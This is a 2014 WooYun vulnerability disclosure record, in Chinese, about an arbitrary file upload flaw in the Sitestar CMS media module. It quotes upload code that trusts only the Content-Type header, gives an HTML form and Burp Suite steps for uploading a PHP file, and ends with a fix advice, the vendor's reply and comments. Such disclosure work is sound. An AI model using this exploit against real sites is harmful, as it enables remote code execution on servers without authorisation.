{"id": 4862, "wybug_id": "wooyun-2014-048841", "wybug_title": "建站之星任意文件上传漏洞(续二)", "wybug_corp": "建站之星", "wybug_author": "felixk3y", "wybug_date": "2014-01-14 12:08", "wybug_open_date": "2014-04-14 12:09", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传漏洞", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向公众公开  简要描述： 建站之星任意文件上传漏洞(续二) 详细说明：  #1 漏洞产生/module/mod_media.phpflash_picker() 和 image_picker() 两个函数image_picker() 函数\n$typeArr = array('image/jpeg','image/pjpeg');        $flash_typeArr = array('image/jpeg','image/pjpeg');        $file_info =& ParamHolder::get('localfile', array(), PS_FILES);        $file_info['name'] = Toolkit::changeFileNameChineseToPinyin($file_info['name']);        if ( sizeof($file_info) > 0 && isset($file_info['name']) )        {\t        // 文件大小\t        if ( ($file_info['size'] == 0) || ($file_info['size'] > $maxsize) ) {\t        \t$err = __('Upload size limit').':2M';\t        // 文件类型        \t} elseif ( !in_array( $file_info['type'], $typeArr ) ) {\t        \t$err = __('Supported file format').':jpg';\t        }else {\t        \t$dest = ROOT.'/upload/image/';\t\t        //$file_info['name'] = Toolkit::randomStr(8).strrchr($file_info[\"name\"],\".\");\t\t        if (preg_match(\"/^WIN/i\", PHP_OS) && preg_match(\"/[\\x80-\\xff]./\", $file_info['name'])) {\t\t\t\t\t$file_info['name'] = iconv(\"UTF-8\", \"GBK//IGNORE\", $file_info['name']);\t\t\t\t}\t        \tif ( move_uploaded_file( $file_info['tmp_name'], $dest.$file_info['name'] ) ) {\t        \t\tParamParser::fire_virus($dest.$file_info['name']);\t        \t\t$wincls = 'OK';\t        \t\t// 图片水印\t\t        \tif( WATERMARK_STATUS ) $this->img_restruck($file_info['name']);\t        \t\t$this->assign('fname', $file_info['name']);\t        \t} else { $err = __('Uploading file failed!'); }\t        }        }\nflash_picker()函数\n$typeArr = array('application/x-shockwave-flash','application/x-download');        $file_info =& ParamHolder::get('localfile', array(), PS_FILES);        if ( sizeof($file_info) > 0 && isset($file_info['name']) )        {\t        // 文件大小\t        if ( ($file_info['size'] == 0) || ($file_info['size'] > $maxsize) ) {\t        \t$err = '上传大小限制:2M';\t        // 文件类型        \t} elseif ( !in_array( $file_info['type'], $typeArr ) ) {\t        \t//$err = '支持的文件类型:swf|flv';\t        \t$err = '支持的文件类型:swf';\t        } else {\t        \t$dest = ROOT.'/upload/flash/';\t        \t$file_info['name'] = Toolkit::randomStr(8).strrchr($file_info[\"name\"],\".\");\t        \tif ( move_uploaded_file( $file_info['tmp_name'], $dest.$file_info['name'] ) ) {\t        \t\tParamParser::fire_virus($dest.$file_info['name']);\t        \t\t$wincls = 'OK';\t        \t\t$this->assign('fname', $file_info['name']);\t        \t} else { $err = '上传失败'; }\t        }        }\n看见了吧 两个函数都只检查了Content-Type参数你们难道不知道Content-Type参数可以被完全控制吗?鉴于这两个文件上传比较简单 就不多说了...   漏洞证明：  #2 漏洞利用将如下代码保存为upload.htm\n<form enctype=\"multipart/form-data\" method=\"post\" action=\"http://www.vulns.org/sitestar/index.php?_m=mod_media&_a=flash_picker\">Flash:<input type=\"file\" name=\"localfile\"/><input id=\"Upload\" type=\"submit\" value=\"Upload\"></form>\n访问upload.php并上传文件,上传的时候用Burpsuite 抓包 并修改\n\n点击Forward即可在 /upload/flash 下面生成php文件\n\n   修复方案：  强烈建议采用统一的上传代码;对文件进行安全检查时，千万别只检查文件上传的Content-Type参数,这个参数只要抓包就可以对其进行任意修改。   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-01-15 09:01 厂商回复： 安全补丁包之前就已经发布,在管理后台可以直接升级修复.此漏洞在下载版中由于服务器环境不同而存在危险,建议使用我司建站之星下载版的用户在后台进行安全补丁的升级. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-14 12:36 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  mark!一楼留名!!    \n     2014-01-14 22:08 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  mark!二楼瓜子!!    \n     2014-05-02 14:56 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  文件名是随机生成的？    \n     2014-08-29 13:15 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  @郭斯特  \t        \t$file_info['name'] = Toolkit::randomStr(8).strrchr($file_info[\"name\"],\".\"); 是的    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}